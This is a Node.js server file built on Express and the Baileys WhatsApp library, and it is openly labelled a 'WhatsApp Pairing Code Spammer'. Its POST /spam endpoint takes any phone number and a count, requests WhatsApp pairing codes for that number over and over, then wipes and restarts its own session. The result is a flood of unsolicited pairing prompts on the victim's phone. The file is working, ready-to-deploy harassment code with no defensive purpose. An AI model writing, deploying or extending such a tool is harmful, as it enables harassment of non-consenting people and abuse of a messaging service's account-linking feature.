// server.js
const express = require("express");
const fs = require("fs");
const chalk = require("chalk");
const { Boom } = require("@hapi/boom");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
} = require("@whiskeysockets/baileys");

const app = express();
const PORT = process.env.PORT || 3000;
const SESSION_DIR = "./sessions";

app.use(express.json());

let sock; // keep global

// Delay helper
const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

/**
 * Start Baileys socket
 */
async function startSock() {
  console.log(chalk.yellow("🚀 Starting WhatsApp socket..."));

  const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: true, // just in case
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      console.log(chalk.green("[SOCK] ✅ Connected and ready"));
    } else if (connection === "close") {
      const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
      console.log(chalk.red(`[SOCK] ❌ Disconnected. Reason: ${reason}`));

      switch (reason) {
        case DisconnectReason.badSession:
          console.log("Bad session. Clearing and restarting...");
          clearSessionAndRestart();
          break;
        case DisconnectReason.connectionClosed:
        case DisconnectReason.connectionLost:
        case DisconnectReason.timedOut:
        case DisconnectReason.restartRequired:
          console.log("Reconnecting...");
          startSock();
          break;
        case DisconnectReason.loggedOut:
          console.log("Logged out. Clearing and restarting...");
          clearSessionAndRestart();
          break;
        default:
          console.log("Unknown disconnect. Restarting...");
          startSock();
      }
    }
  });
}

/**
 * Clear session and restart socket
 */
function clearSessionAndRestart() {
  try {
    if (fs.existsSync(SESSION_DIR)) {
      fs.rmSync(SESSION_DIR, { recursive: true, force: true });
      console.log(chalk.red("🗑️ Session cleared."));
    }
  } catch (err) {
    console.error("Error clearing session:", err);
  }
  console.log(chalk.yellow("🔄 Restarting socket..."));
  startSock();
}

/**
 * API: /spam
 * Example body: { "number": "233xxxxxxxxx", "count": 2 }
 */
app.post("/spam", async (req, res) => {
  const { number, count } = req.body;

  if (!number || !count) {
    return res.status(400).json({ error: "Missing number or count" });
  }

  if (!sock) {
    return res.status(500).json({ error: "Socket not initialized yet" });
  }

  console.log(chalk.blue(`📡 Spam request: ${number} | Count: ${count}`));

  try {
    for (let i = 0; i < count; i++) {
      const code = await sock.requestPairingCode(number);
      console.log(chalk.green(`✅ Pairing Code [${i + 1}/${count}]: ${code}`));
      await sleep(1000); // 1 second delay
    }

    // after spam, reset session
    console.log(chalk.yellow("⚡ Spam finished. Restarting session..."));
    clearSessionAndRestart();

    return res.json({ success: true, message: `Requested ${count} codes.` });
  } catch (err) {
    console.error("❌ Error during spam:", err);
    clearSessionAndRestart();
    return res.status(500).json({ error: "Failed during spam, restarting..." });
  }
});

app.get("/", (req, res) => {
  res.send("✅ WhatsApp Pairing Code Spammer running on Render.");
});

app.listen(PORT, () => {
  console.log(chalk.cyan(`🌍 Server running at http://localhost:${PORT}`));
  startSock(); // start Baileys when server boots
});
